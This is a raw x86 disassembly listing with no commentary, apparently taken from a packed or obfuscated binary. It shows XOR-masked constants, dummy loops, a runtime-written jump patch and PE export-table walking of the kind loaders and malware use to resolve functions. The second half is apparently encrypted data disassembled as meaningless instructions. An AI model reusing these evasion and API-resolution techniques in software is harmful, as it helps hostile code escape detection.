  40e40b:	jbe    0x40e439
  40e411:	jmp    0x40e42c
  40e416:	push   0x432014
  40e41b:	push   DWORD PTR [ebp-0x14]
  40e41e:	push   0x7281
  40e423:	push   DWORD PTR [ebp-0x1c]
  40e426:	call   DWORD PTR ds:0x4348c3
  40e42c:	cmp    DWORD PTR ds:0x42f018,0x1a
  40e433:	jb     0x40e3f5
  40e439:	or     DWORD PTR [ebp-0x18],0xf89f0581
  40e440:	and    DWORD PTR ds:0x43200c,0x0
  40e44a:	mov    esi,DWORD PTR ds:0x43200c
  40e450:	inc    esi
  40e451:	mov    DWORD PTR ds:0x43200c,esi
  40e457:	cmp    DWORD PTR ds:0x43200c,0x8
  40e45e:	jg     0x40e49b
  40e464:	jmp    0x40e472
  40e469:	push   DWORD PTR [ebp-0x24]
  40e46c:	call   DWORD PTR ds:0x4348c7
  40e472:	cmp    DWORD PTR ds:0x43200c,0x7
  40e479:	jne    0x40e48e
  40e47f:	xor    esi,esi
  40e481:	or     esi,DWORD PTR ds:0x43200c
  40e487:	inc    esi
  40e488:	mov    DWORD PTR ds:0x43200c,esi
  40e48e:	cmp    DWORD PTR ds:0x43200c,0x1d
  40e495:	jb     0x40e44a
  40e49b:	mov    eax,DWORD PTR [ebp-0xc]
  40e49e:	mov    ecx,DWORD PTR [ebp-0xc]
  40e4a1:	sub    DWORD PTR ds:0x42e020,0x4ecf
  40e4ab:	sub    eax,ecx
  40e4ad:	sub    DWORD PTR ds:0x430004,edx
  40e4b3:	mov    DWORD PTR [ebp-0xc],eax
  40e4b6:	or     ecx,ecx
  40e4b8:	or     DWORD PTR [ebp-0xc],0xf89c85c1
  40e4bf:	sbb    eax,edi
  40e4c1:	mov    eax,DWORD PTR [ebp-0x1c]
  40e4c4:	and    DWORD PTR ds:0x431018,ebx
  40e4ca:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e4cd:	sub    eax,ecx
  40e4cf:	mov    DWORD PTR [ebp-0x1c],eax
  40e4d2:	or     DWORD PTR [ebp-0x1c],0xf89c85a1
  40e4d9:	mov    eax,DWORD PTR [ebp-0x20]
  40e4dc:	mov    ecx,DWORD PTR [ebp-0x20]
  40e4df:	sub    eax,ecx
  40e4e1:	mov    DWORD PTR [ebp-0x20],eax
  40e4e4:	mov    eax,DWORD PTR [ebp-0x2c]
  40e4e7:	mov    ecx,DWORD PTR [ebp-0x20]
  40e4ea:	mov    esi,0x751089d
  40e4ef:	xor    eax,esi
  40e4f1:	mov    edi,0x3272e4
  40e4f6:	add    eax,edi
  40e4f8:	or     eax,ecx
  40e4fa:	mov    DWORD PTR [ebp-0x20],eax
  40e4fd:	mov    eax,DWORD PTR [ebp-0x4]
  40e500:	mov    ecx,DWORD PTR [ebp-0x4]
  40e503:	sub    eax,ecx
  40e505:	mov    DWORD PTR [ebp-0x4],eax
  40e508:	or     DWORD PTR [ebp-0x4],0xf89c85bc
  40e50f:	mov    eax,DWORD PTR [ebp-0xc]
  40e512:	xor    eax,esi
  40e514:	add    eax,edi
  40e516:	push   eax
  40e517:	mov    eax,DWORD PTR [ebp-0x10]
  40e51a:	xor    eax,esi
  40e51c:	add    eax,edi
  40e51e:	push   eax
  40e51f:	mov    eax,DWORD PTR [ebp-0x4]
  40e522:	xor    eax,esi
  40e524:	add    eax,edi
  40e526:	push   eax
  40e527:	lea    eax,[ebp-0x7c]
  40e52a:	push   eax
  40e52b:	push   DWORD PTR [ebp-0x2c]
  40e52e:	push   DWORD PTR [ebp-0x28]
  40e531:	call   0x41104a
  40e536:	test   eax,eax
  40e538:	je     0x40e566
  40e53e:	lea    eax,[ebp-0x7c]
  40e541:	push   eax
  40e542:	mov    eax,DWORD PTR [ebp-0x28]
  40e545:	xor    eax,esi
  40e547:	add    eax,edi
  40e549:	push   eax
  40e54a:	mov    eax,DWORD PTR [ebp-0x24]
  40e54d:	add    eax,0xaa
  40e552:	push   eax
  40e553:	mov    eax,DWORD PTR [ebp-0x24]
  40e556:	mov    eax,DWORD PTR [eax+0x198]
  40e55c:	push   DWORD PTR [eax]
  40e55e:	call   0x409457
  40e563:	mov    DWORD PTR [ebp-0x14],eax
  40e566:	lea    eax,[ebp+0x4]
  40e569:	mov    DWORD PTR [ebp-0x30],eax
  40e56c:	mov    eax,DWORD PTR [ebp-0x14]
  40e56f:	test   eax,eax
  40e571:	je     0x40e5d9
  40e577:	lea    eax,[ebp-0x8]
  40e57a:	mov    DWORD PTR [ebp-0x38],eax
  40e57d:	mov    eax,DWORD PTR [ebp-0x34]
  40e580:	mov    DWORD PTR [ebp-0x8],eax
  40e583:	mov    eax,DWORD PTR [ebp-0x8]
  40e586:	mov    ecx,DWORD PTR [ebp-0x14]
  40e589:	sub    eax,ecx
  40e58b:	mov    DWORD PTR [ebp-0x8],eax
  40e58e:	mov    ecx,DWORD PTR [ebp-0x4]
  40e591:	xor    ecx,esi
  40e593:	mov    eax,0xffcd8d1c
  40e598:	sub    eax,ecx
  40e59a:	add    DWORD PTR [ebp-0x8],eax
  40e59d:	mov    eax,DWORD PTR [ebp-0x8]
  40e5a0:	mov    ecx,DWORD PTR [ebp-0x14]
  40e5a3:	mov    DWORD PTR [ecx+0x1],eax
  40e5a6:	mov    eax,DWORD PTR [ebp-0x14]
  40e5a9:	push   DWORD PTR [ebp-0x24]
  40e5ac:	mov    BYTE PTR [eax],0xe9
  40e5af:	mov    eax,ds:0x434153
  40e5b4:	push   DWORD PTR [eax]
  40e5b6:	push   DWORD PTR ds:0x4343af
  40e5bc:	push   DWORD PTR ds:0x43415b
  40e5c2:	push   DWORD PTR ds:0x43438f
  40e5c8:	push   DWORD PTR ds:0x43465b
  40e5ce:	push   DWORD PTR [ebp-0x28]
  40e5d1:	push   DWORD PTR [ebp-0x2c]
  40e5d4:	mov    eax,DWORD PTR [ebp-0x14]
  40e5d7:	call   eax
  40e5d9:	mov    eax,DWORD PTR [ebp-0x30]
  40e5dc:	mov    ecx,DWORD PTR ds:0x434353
  40e5e2:	add    DWORD PTR [eax],ecx
  40e5e4:	pop    edi
  40e5e5:	pop    esi
  40e5e6:	leave  
  40e5e7:	ret    
  40e5e8:	push   ebp
  40e5e9:	mov    ebp,esp
  40e5eb:	sub    esp,0x18
  40e5ee:	xor    DWORD PTR ds:0x431008,ecx
  40e5f4:	mov    DWORD PTR [ebp-0x10],0xf89f8581
  40e5fb:	lea    eax,[ebp+0x14]
  40e5fe:	mov    DWORD PTR [ebp-0x4],eax
  40e601:	mov    DWORD PTR ds:0x42e000,0x18
  40e60b:	cmp    DWORD PTR ds:0x42e000,0x0
  40e612:	je     0x40e669
  40e618:	cmp    DWORD PTR ds:0x42e000,0x8
  40e61f:	jge    0x40e669
  40e625:	jmp    0x40e63b
  40e62a:	push   DWORD PTR [ebp-0x20]
  40e62d:	push   DWORD PTR [ebp-0x20]
  40e630:	push   0x8017
  40e635:	call   DWORD PTR ds:0x4348cb
  40e63b:	cmp    DWORD PTR ds:0x42e000,0x9
  40e642:	jne    0x40e657
  40e648:	xor    edx,edx
  40e64a:	or     edx,DWORD PTR ds:0x42e000
  40e650:	dec    edx
  40e651:	mov    DWORD PTR ds:0x42e000,edx
  40e657:	mov    edx,DWORD PTR ds:0x42e000
  40e65d:	dec    edx
  40e65e:	mov    DWORD PTR ds:0x42e000,edx
  40e664:	jmp    0x40e60b
  40e669:	push   esi
  40e66a:	and    DWORD PTR ds:0x43101c,0x0
  40e674:	jmp    0x40e686
  40e679:	mov    edx,DWORD PTR ds:0x43101c
  40e67f:	inc    edx
  40e680:	mov    DWORD PTR ds:0x43101c,edx
  40e686:	cmp    DWORD PTR ds:0x43101c,0x1d
  40e68d:	jae    0x40e6c2
  40e693:	cmp    DWORD PTR ds:0x43101c,0x25
  40e69a:	jg     0x40e6c2
  40e6a0:	jmp    0x40e6bd
  40e6a5:	push   0x7038
  40e6aa:	push   0x42f000
  40e6af:	push   0x153b
  40e6b4:	push   DWORD PTR [ebp-0x20]
  40e6b7:	call   DWORD PTR ds:0x4348f3
  40e6bd:	jmp    0x40e679
  40e6c2:	mov    esi,0xf89c8581
  40e6c7:	mov    DWORD PTR [ebp-0xc],esi
  40e6ca:	mov    DWORD PTR ds:0x430014,0x1e
  40e6d4:	cmp    DWORD PTR ds:0x430014,0x0
  40e6db:	je     0x40e718
  40e6e1:	cmp    DWORD PTR ds:0x430014,0x2c
  40e6e8:	jb     0x40e718
  40e6ee:	jmp    0x40e706
  40e6f3:	push   0x5604
  40e6f8:	push   DWORD PTR [ebp-0x10]
  40e6fb:	push   0x5bf9
  40e700:	call   DWORD PTR ds:0x4348cf
  40e706:	mov    edx,DWORD PTR ds:0x430014
  40e70c:	dec    edx
  40e70d:	mov    DWORD PTR ds:0x430014,edx
  40e713:	jmp    0x40e6d4
  40e718:	lea    eax,[ebp-0xc]
  40e71b:	sub    ecx,ecx
  40e71d:	mov    DWORD PTR [ebp-0x14],eax
  40e720:	sbb    edx,ecx
  40e722:	mov    eax,DWORD PTR [ebp-0xc]
  40e725:	mov    edx,DWORD PTR [ebp-0x14]
  40e728:	xor    ecx,0x2f7f
  40e72e:	mov    ecx,0x751089d
  40e733:	sbb    DWORD PTR ds:0x42e010,0xf56
  40e73d:	xor    eax,ecx
  40e73f:	xor    DWORD PTR ds:0x431010,0x42f00c
  40e749:	add    eax,0x3272e4
  40e74e:	mov    DWORD PTR [edx],eax
  40e750:	mov    eax,ds:0x43414f
  40e755:	mov    edx,DWORD PTR [ebp-0x4]
  40e758:	mov    eax,DWORD PTR [eax]
  40e75a:	add    eax,DWORD PTR [edx]
  40e75c:	adc    edx,DWORD PTR ds:0x42f00c
  40e762:	push   edi
  40e763:	mov    edx,DWORD PTR ds:0x42e010
  40e769:	adc    DWORD PTR ds:0x42f010,edx
  40e76f:	mov    DWORD PTR [ebp-0x8],eax
  40e772:	sbb    edx,eax
  40e774:	mov    edi,DWORD PTR [ebp+0x8]
  40e777:	mov    edx,DWORD PTR ds:0x42e01c
  40e77d:	sub    DWORD PTR ds:0x431018,edx
  40e783:	mov    eax,ds:0x4342d7
  40e788:	mov    eax,DWORD PTR [eax+0x198]
  40e78e:	xor    edi,ecx
  40e790:	mov    edx,0x3272e4
  40e795:	add    DWORD PTR ds:0x432000,0x559c
  40e79f:	add    edi,edx
  40e7a1:	mov    DWORD PTR ds:0x42f01c,0x7a9a
  40e7ab:	cmp    DWORD PTR [eax],edi
  40e7ad:	mov    DWORD PTR ds:0x432018,0x2065
  40e7b7:	je     0x40e7c4
  40e7bd:	mov    eax,DWORD PTR [eax]
  40e7bf:	jmp    0x40eb48
  40e7c4:	mov    DWORD PTR ds:0x430014,0x19b0
  40e7ce:	mov    eax,DWORD PTR [ebp+0x18]
  40e7d1:	cmp    eax,esi
  40e7d3:	mov    DWORD PTR ds:0x430010,0x5283
  40e7dd:	jne    0x40e7f7
  40e7e3:	push   0xf89c8580
  40e7e8:	mov    DWORD PTR ds:0x42e008,0x5561
  40e7f2:	jmp    0x40eb37
  40e7f7:	mov    esi,DWORD PTR [ebp+0x18]
  40e7fa:	mov    DWORD PTR ds:0x431014,0x325b
  40e804:	mov    eax,0xf89c8583
  40e809:	mov    DWORD PTR ds:0x430010,0x6ef3
  40e813:	cmp    esi,eax
  40e815:	mov    DWORD PTR ds:0x43100c,0x3861
  40e81f:	jne    0x40eb27
  40e825:	and    DWORD PTR ds:0x431014,0x0
  40e82f:	mov    eax,ds:0x431014
  40e834:	inc    eax
  40e835:	mov    ds:0x431014,eax
  40e83a:	cmp    DWORD PTR ds:0x431014,0xc
  40e841:	jl     0x40e889
  40e847:	jmp    0x40e861
  40e84c:	push   0x7302
  40e851:	push   0x43200c
  40e856:	push   0x434105
  40e85b:	call   DWORD PTR ds:0x4348fb
  40e861:	cmp    DWORD PTR ds:0x431014,0xb
  40e868:	jne    0x40e87c
  40e86e:	xor    eax,eax
  40e870:	or     eax,DWORD PTR ds:0x431014
  40e876:	inc    eax
  40e877:	mov    ds:0x431014,eax
  40e87c:	cmp    DWORD PTR ds:0x431014,0x1a
  40e883:	jb     0x40e82f
  40e889:	mov    eax,DWORD PTR [ebp+0x10]
  40e88c:	xor    eax,ecx
  40e88e:	add    esi,0x7467
  40e894:	add    eax,edx
  40e896:	and    DWORD PTR ds:0x431004,0x42e014
  40e8a0:	mov    DWORD PTR [ebp-0x18],eax
  40e8a3:	or     DWORD PTR ds:0x42f010,0x747e
  40e8ad:	mov    eax,DWORD PTR [ebp+0xc]
  40e8b0:	adc    esi,0x7f18
  40e8b6:	mov    esi,DWORD PTR [ebp-0x8]
  40e8b9:	xor    eax,ecx
  40e8bb:	or     DWORD PTR ds:0x430014,0x1014
  40e8c5:	add    eax,edx
  40e8c7:	mov    DWORD PTR ds:0x432000,0x725d
  40e8d1:	imul   eax,DWORD PTR [esi]
  40e8d4:	and    DWORD PTR ds:0x42f004,0x0
  40e8de:	jmp    0x40e8f0
  40e8e3:	mov    esi,DWORD PTR ds:0x42f004
  40e8e9:	inc    esi
  40e8ea:	mov    DWORD PTR ds:0x42f004,esi
  40e8f0:	cmp    DWORD PTR ds:0x42f004,0x1f
  40e8f7:	jae    0x40e94e
  40e8fd:	cmp    DWORD PTR ds:0x42f004,0x4
  40e904:	jge    0x40e94e
  40e90a:	jmp    0x40e92f
  40e90f:	push   0x1e35
  40e914:	push   0x4340ed
  40e919:	push   0x4e7c
  40e91e:	push   0x434105
  40e923:	push   DWORD PTR [ebp-0x28]
  40e926:	push   DWORD PTR [ebp-0x10]
  40e929:	call   DWORD PTR ds:0x4348ff
  40e92f:	cmp    DWORD PTR ds:0x42f004,0x3
  40e936:	jne    0x40e949
  40e93c:	mov    esi,DWORD PTR ds:0x42f004
  40e942:	inc    esi
  40e943:	mov    DWORD PTR ds:0x42f004,esi
  40e949:	jmp    0x40e8e3
  40e94e:	mov    esi,DWORD PTR [ebp+0x8]
  40e951:	adc    DWORD PTR ds:0x43201c,0x42e01c
  40e95b:	xor    esi,ecx
  40e95d:	mov    DWORD PTR ds:0x42e028,0x65d7
  40e967:	add    esi,edx
  40e969:	cmp    esi,eax
  40e96b:	not    DWORD PTR ds:0x42f008
  40e971:	mov    eax,DWORD PTR [ebp-0x4]
  40e974:	mov    DWORD PTR ds:0x432000,0x15b7
  40e97e:	push   ebx
  40e97f:	je     0x40e9c8
  40e985:	adc    DWORD PTR ds:0x42e004,edx
  40e98b:	mov    esi,DWORD PTR [ebp-0x18]
  40e98e:	adc    DWORD PTR ds:0x432008,0x42e020
  40e998:	add    DWORD PTR [eax],esi
  40e99a:	add    DWORD PTR ds:0x431018,0x5c37
  40e9a4:	mov    eax,DWORD PTR [ebp-0x4]
  40e9a7:	or     esi,0x3712
  40e9ad:	mov    esi,DWORD PTR [ebp+0xc]
  40e9b0:	xor    DWORD PTR ds:0x431004,0x42e000
  40e9ba:	xor    esi,ecx
  40e9bc:	add    esi,edx
  40e9be:	imul   esi,DWORD PTR [eax]
  40e9c1:	mov    DWORD PTR [eax],esi
  40e9c3:	jmp    0x40e9cd
  40e9c8:	mov    esi,DWORD PTR [ebp+0x14]
  40e9cb:	xor    DWORD PTR [eax],esi
  40e9cd:	mov    eax,DWORD PTR [ebp-0x4]
  40e9d0:	mov    edi,DWORD PTR [ebp+0x10]
  40e9d3:	xor    edi,ecx
  40e9d5:	mov    esi,0xffcd8d1c
  40e9da:	mov    ebx,esi
  40e9dc:	sub    ebx,edi
  40e9de:	add    DWORD PTR [eax],ebx
  40e9e0:	mov    eax,DWORD PTR [ebp-0x4]
  40e9e3:	mov    edi,DWORD PTR [ebp-0x8]
  40e9e6:	add    edi,DWORD PTR [eax]
  40e9e8:	mov    DWORD PTR [ebp-0x8],edi
  40e9eb:	mov    eax,DWORD PTR [ebp+0xc]
  40e9ee:	mov    edi,DWORD PTR [ebp+0xc]
  40e9f1:	xor    edi,ecx
  40e9f3:	xor    eax,ecx
  40e9f5:	lea    eax,[eax+edi*1+0x64e5c8]
  40e9fc:	mov    edi,DWORD PTR [ebp+0xc]
  40e9ff:	xor    edi,ecx
  40ea01:	add    edi,edx
  40ea03:	imul   eax,edi
  40ea06:	mov    edi,DWORD PTR [ebp+0xc]
  40ea09:	xor    edi,ecx
  40ea0b:	sub    edi,eax
  40ea0d:	mov    eax,DWORD PTR [ebp-0x4]
  40ea10:	add    edi,edx
  40ea12:	cmp    DWORD PTR [eax],edi
  40ea14:	mov    eax,DWORD PTR [ebp-0x4]
  40ea17:	mov    edi,DWORD PTR [ebp+0x10]
  40ea1a:	jg     0x40ea2d
  40ea20:	xor    edi,ecx
  40ea22:	mov    ebx,esi
  40ea24:	sub    ebx,edi
  40ea26:	add    DWORD PTR [eax],ebx
  40ea28:	jmp    0x40ea33
  40ea2d:	xor    edi,ecx
  40ea2f:	add    edi,edx
  40ea31:	add    DWORD PTR [eax],edi
  40ea33:	mov    eax,DWORD PTR [ebp-0x8]
  40ea36:	mov    edi,DWORD PTR [ebp-0x10]
  40ea39:	mov    eax,DWORD PTR [eax]
  40ea3b:	xor    edi,ecx
  40ea3d:	add    edi,0x3272e3
  40ea43:	not    edi
  40ea45:	and    eax,edi
  40ea47:	movsx  di,BYTE PTR [eax+0x1]
  40ea4c:	mov    ebx,0x3b52
  40ea51:	sub    di,bx
  40ea54:	mov    ebx,0x8a8e
  40ea59:	xor    di,bx
  40ea5c:	mov    ebx,0x4f86
  40ea61:	cmp    di,bx
  40ea64:	jne    0x40ea8c
  40ea6a:	movsx  di,BYTE PTR [eax]
  40ea6e:	mov    ebx,0x3b52
  40ea73:	sub    di,bx
  40ea76:	mov    ebx,0x8a8e
  40ea7b:	xor    di,bx
  40ea7e:	mov    ebx,0x4e75
  40ea83:	cmp    di,bx
  40ea86:	je     0x40ea9c
  40ea8c:	mov    edi,DWORD PTR [ebp-0x10]
  40ea8f:	xor    edi,ecx
  40ea91:	mov    ebx,esi
  40ea93:	sub    ebx,edi
  40ea95:	add    eax,ebx
  40ea97:	jmp    0x40ea47
  40ea9c:	mov    esi,DWORD PTR [ebp-0x14]
  40ea9f:	mov    esi,DWORD PTR [esi]
  40eaa1:	mov    edi,DWORD PTR [eax+0x3c]
  40eaa4:	lea    esi,[edi+esi*8+0x78]
  40eaa8:	mov    esi,DWORD PTR [esi+eax*1]
  40eaab:	mov    DWORD PTR [ebp-0x8],esi
  40eaae:	mov    esi,DWORD PTR [ebp+0x8]
  40eab1:	xor    esi,ecx
  40eab3:	add    esi,edx
  40eab5:	mov    DWORD PTR [ebp-0x14],esi
  40eab8:	mov    esi,DWORD PTR [ebp+0x8]
  40eabb:	mov    edi,DWORD PTR [ebp-0x8]
  40eabe:	xor    esi,ecx
  40eac0:	add    esi,edx
  40eac2:	pop    ebx
  40eac3:	cmp    edi,esi
  40eac5:	jne    0x40eae3
  40eacb:	mov    eax,DWORD PTR [ebp+0xc]
  40eace:	xor    eax,ecx
  40ead0:	mov    ecx,DWORD PTR [ebp-0x8]
  40ead3:	add    eax,edx
  40ead5:	imul   eax,ecx
  40ead8:	mov    DWORD PTR [ebp-0x8],eax
  40eadb:	push   DWORD PTR [ebp+0x18]
  40eade:	jmp    0x40eb37
  40eae3:	mov    ecx,DWORD PTR [ebp-0x8]
  40eae6:	add    ecx,eax
  40eae8:	mov    DWORD PTR [ebp-0x14],ecx
  40eaeb:	mov    ecx,DWORD PTR [ebp-0x14]
  40eaee:	mov    ecx,DWORD PTR [ecx+0xc]
  40eaf1:	movsx  cx,BYTE PTR [ecx+eax*1]
  40eaf6:	mov    edx,0x3b52
  40eafb:	sub    cx,dx
  40eafe:	mov    edx,0x8a8e
  40eb03:	xor    cx,dx
  40eb06:	mov    edx,0x4e77
  40eb0b:	cmp    cx,dx
  40eb0e:	jne    0x40eadb
  40eb14:	mov    ecx,DWORD PTR ds:0x4342d7
  40eb1a:	mov    ecx,DWORD PTR [ecx+0x198]
  40eb20:	mov    DWORD PTR [ecx],eax
  40eb22:	jmp    0x40eb48
  40eb27:	mov    ecx,DWORD PTR [ebp+0x18]
  40eb2a:	cmp    ecx,0xf89c8580
  40eb30:	jne    0x40eb48
  40eb36:	push   eax
  40eb37:	push   DWORD PTR [ebp+0x14]
  40eb3a:	push   DWORD PTR [ebp+0x10]
  40eb3d:	push   DWORD PTR [ebp+0xc]
  40eb40:	push   DWORD PTR [ebp+0x8]
  40eb43:	call   0x40e5e8
  40eb48:	pop    edi
  40eb49:	pop    esi
  40eb4a:	leave  
  40eb4b:	ret    0x14
  40eb4e:	push   ebp
  40eb4f:	mov    ebp,esp
  40eb51:	sub    esp,0xc
  40eb54:	sbb    edx,edx
  40eb56:	push   esi
  40eb57:	add    DWORD PTR ds:0x42e028,ebx
  40eb5d:	mov    esi,0xf89c8581
  40eb62:	mov    DWORD PTR ds:0x430014,0x17
  40eb6c:	cmp    DWORD PTR ds:0x430014,0x0
  40eb73:	je     0x40ebd3
  40eb79:	cmp    DWORD PTR ds:0x430014,0x4
  40eb80:	jg     0x40ebd3
  40eb86:	jmp    0x40eba3
  40eb8b:	push   0x42f018
  40eb90:	push   0x49bf
  40eb95:	push   0x8fc2
  40eb9a:	push   DWORD PTR [ebp-0x10]
  40eb9d:	call   DWORD PTR ds:0x4348d3
  40eba3:	cmp    DWORD PTR ds:0x430014,0x5
  40ebaa:	jne    0x40ebbf
  40ebb0:	xor    edx,edx
  40ebb2:	xor    edx,DWORD PTR ds:0x430014
  40ebb8:	dec    edx
  40ebb9:	mov    DWORD PTR ds:0x430014,edx
  40ebbf:	xor    edx,edx
  40ebc1:	add    edx,DWORD PTR ds:0x430014
  40ebc7:	dec    edx
  40ebc8:	mov    DWORD PTR ds:0x430014,edx
  40ebce:	jmp    0x40eb6c
  40ebd3:	mov    DWORD PTR [ebp-0x8],esi
  40ebd6:	mov    DWORD PTR [ebp-0x4],0xf89c8580
  40ebdd:	push   edi
  40ebde:	inc    edi
  40ebdf:	mov    eax,eax
  40ebe1:	mov    eax,DWORD PTR [ebp-0x4]
  40ebe4:	and    DWORD PTR ds:0x43201c,0x0
  40ebee:	mov    edx,DWORD PTR ds:0x43201c
  40ebf4:	inc    edx
  40ebf5:	mov    DWORD PTR ds:0x43201c,edx
  40ebfb:	cmp    DWORD PTR ds:0x43201c,0x6
  40ec02:	jge    0x40ec3f
  40ec08:	jmp    0x40ec18
  40ec0d:	push   0x29a4
  40ec12:	call   DWORD PTR ds:0x4348d7
  40ec18:	cmp    DWORD PTR ds:0x43201c,0x5
  40ec1f:	jne    0x40ec32
  40ec25:	mov    edx,DWORD PTR ds:0x43201c
  40ec2b:	inc    edx
  40ec2c:	mov    DWORD PTR ds:0x43201c,edx
  40ec32:	cmp    DWORD PTR ds:0x43201c,0x1f
  40ec39:	jb     0x40ebee
  40ec3f:	mov    edi,DWORD PTR [ebp-0x8]
  40ec42:	mov    ecx,0x751089d
  40ec47:	mov    edx,DWORD PTR ds:0x42f000
  40ec4d:	sub    DWORD PTR ds:0x43000c,edx
  40ec53:	jmp    0x410fbf
  40ec58:	xor    BYTE PTR [eax],cl
  40ec5a:	(bad)  
  40ec5c:	test   DWORD PTR [ebx+0x73],esi
  40ec5f:	or     BYTE PTR [ebx],bl
  40ec61:	loope  0x40ec3d
  40ec63:	lds    edi,FWORD PTR [ebx]
  40ec65:	je     0x40ec69
  40ec67:	ja     0x40ec9b
  40ec69:	int    0x72
  40ec6b:	jb     0x40ec90
  40ec6d:	pop    edi
  40ec6e:	jb     0x40ece2
  40ec70:	test   al,0x6b
  40ec72:	push   ebx
  40ec73:	cmp    al,0x92
  40ec75:	sub    dl,ch
  40ec77:	loope  0x40ec2a
  40ec79:	cs call 0x92d4bb9e
  40ec7f:	inc    ebx
  40ec80:	adc    dl,dh
  40ec82:	retf   0x64ac
  40ec85:	outs   dx,BYTE PTR ds:[esi]
  40ec86:	ffree  st(6)
  40ec88:	cmp    bl,bh
  40ec8a:	dec    eax
  40ec8b:	mov    al,0xea
  40ec8d:	mov    BYTE PTR [edi+0x10b4ac71],al
  40ec93:	bound  ebp,QWORD PTR [ecx-0x6d]
  40ec96:	cmp    al,0x94
  40ec98:	das    
  40ec99:	inc    DWORD PTR [ebx+0x1109c3ce]
  40ec9f:	pop    es
  40eca0:	dec    ebp
  40eca1:	sbb    BYTE PTR [eax-0x1e],bh
  40eca4:	adc    ch,BYTE PTR [ebx+0x62713310]
  40ecaa:	mov    ecx,0x62f0d877
  40ecaf:	repnz or al,0xa4
  40ecb2:	sub    eax,0x883fba39
  40ecb7:	cmp    dh,BYTE PTR ds:0xa3ff4a46
  40ecbd:	in     al,0xd5
  40ecbf:	lods   al,BYTE PTR ds:[esi]
  40ecc0:	xchg   edi,eax
  40ecc1:	dec    ecx
  40ecc2:	mov    ecx,eax
  40ecc4:	mov    dl,0x4e
  40ecc6:	aaa    
  40ecc7:	sub    dl,ah
  40ecc9:	mov    ah,0x5a
  40eccb:	xor    eax,0x637dc888
  40ecd0:	adc    ecx,DWORD PTR [esi]
  40ecd2:	loope  0x40ed52
  40ecd4:	cmp    BYTE PTR [esp+ebx*8-0x6a],al
  40ecd8:	push   edx
  40ecd9:	shr    DWORD PTR [ecx-0x1f],0x4c
  40ecdd:	(bad)  
  40ecde:	xor    DWORD PTR [edx-0x80],esp
  40ece1:	inc    eax
  40ece2:	mov    edi,0xcfe58bcd
  40ece7:	pop    eax
  40ece8:	jno    0x40ed0f
  40ecea:	mov    edx,esi
  40ecec:	xor    DWORD PTR [edi+0x75],0xa47c168a
  40ecf3:	and    cl,bl
  40ecf5:	repz fdivr DWORD PTR [edx+0x3f21ce57]
  40ecfc:	aas    
  40ecfd:	div    ch
  40ecff:	call   0xcc95:0x8e47c4a8
  40ed06:	mul    BYTE PTR [esi]
  40ed08:	mul    ecx
  40ed0a:	pop    ds
  40ed0b:	or     DWORD PTR [eax-0x5b1b9fb7],eax
  40ed11:	lods   eax,DWORD PTR ds:[esi]
  40ed12:	cli    
  40ed13:	and    DWORD PTR [ebp-0x7ac0dba0],0xe90334b3
  40ed1d:	push   edx
  40ed1e:	pop    edi
  40ed1f:	add    BYTE PTR [ecx+0x3440c61c],dh
  40ed25:	out    dx,eax
  40ed26:	mov    bl,0xd9
  40ed28:	loopne 0x40ed73
  40ed2a:	lods   eax,DWORD PTR ds:[esi]
  40ed2b:	into   
  40ed2c:	dec    eax
  40ed2d:	or     edx,DWORD PTR [esi+ebp*8-0x7e]
  40ed31:	mov    dl,0x86
  40ed33:	adc    bh,BYTE PTR [ebx-0x246f1e12]
  40ed39:	sub    dh,dl
  40ed3b:	int    0xcf
  40ed3d:	push   esi
  40ed3e:	add    eax,0xa218154
  40ed43:	fcmove st,st(6)
  40ed45:	add    eax,esi
  40ed47:	push   esi
  40ed48:	sar    DWORD PTR [ebx+0x2f],cl
  40ed4b:	(bad)  
  40ed4c:	push   edx
  40ed4d:	(bad)  
  40ed4e:	cmp    DWORD PTR [edx],ebp
  40ed50:	jmp    0x7016:0x3f5268d6
  40ed57:	dec    edi
  40ed58:	gs pop esi
  40ed5a:	fcom   QWORD PTR [ebx-0xad8c636]
  40ed60:	mov    eax,0x54e41624
  40ed65:	shr    al,1
  40ed67:	ins    DWORD PTR es:[edi],dx
  40ed68:	pop    ecx
  40ed69:	addr16 pushf 
  40ed6b:	int3   
  40ed6c:	popa   
  40ed6d:	mov    al,0xa1
  40ed6f:	popf   
  40ed70:	mov    eax,ds:0x5729118e
  40ed75:	(bad)  
  40ed76:	inc    ebp
  40ed77:	sub    al,0xbe
  40ed79:	stos   BYTE PTR es:[edi],al
  40ed7a:	cmp    eax,0xf40fa81b
  40ed7f:	repnz add bh,BYTE PTR [edi]
  40ed82:	xlat   BYTE PTR ds:[ebx]
  40ed83:	pop    esi
  40ed84:	or     BYTE PTR [esi+0x7b],dh
  40ed87:	test   eax,0x8b006802
  40ed8c:	pop    edx
  40ed8d:	xchg   esi,eax
  40ed8e:	adc    DWORD PTR [edx-0x60],ecx
  40ed91:	lods   eax,DWORD PTR ds:[esi]
  40ed92:	push   ds
  40ed93:	and    al,0x89
  40ed95:	cmp    DWORD PTR [ebx],ecx
  40ed97:	sbb    BYTE PTR [edx-0x430e4703],ch
  40ed9d:	dec    esp
  40ed9e:	jo     0x40ed64
  40eda0:	and    dl,BYTE PTR [eax]
  40eda2:	xchg   esi,eax
  40eda3:	int3   
  40eda4:	shr    DWORD PTR [edi-0x398fa2f2],1
  40edaa:	std    
  40edab:	in     eax,dx
  40edac:	out    dx,eax
  40edad:	jmp    0xd075:0x4958e57d
  40edb4:	clc    
  40edb5:	cmp    BYTE PTR [eax],dl
  40edb7:	dec    edx
  40edb8:	test   edi,ebp
  40edba:	mov    esi,0x15e32083
  40edbf:	clc    
  40edc0:	in     eax,dx
  40edc1:	mov    edi,0xb0067b73
  40edc6:	hlt    
  40edc7:	ds std 
  40edc9:	and    BYTE PTR ds:0xc49de9d1,cl
  40edcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edd0:	jmp    0x370f:0xaf8c4294
  40edd7:	cmp    esp,ebx
  40edd9:	sub    eax,0xbd8f23e
  40edde:	push   ds
  40eddf:	ds stos DWORD PTR es:[edi],eax
  40ede1:	jmp    0x40edae
  40ede3:	cli    
  40ede4:	fcom   DWORD PTR [eax]
  40ede6:	cli    
  40ede7:	out    0x0,al
  40ede9:	mov    ds:0xcf9c1e88,al
  40edee:	cld    
  40edef:	sbb    bl,bl
  40edf1:	adc    al,0x66
  40edf3:	out    0xb8,al
  40edf5:	push   edi
  40edf6:	jl     0x40ee49
  40edf8:	pushf  
  40edf9:	cmp    esp,DWORD PTR [eax+eiz*2+0x41]
  40edfd:	je     0x40ee28
  40edff:	pop    edx
  40ee00:	mov    ah,0x6f
  40ee02:	mov    bh,0xb4
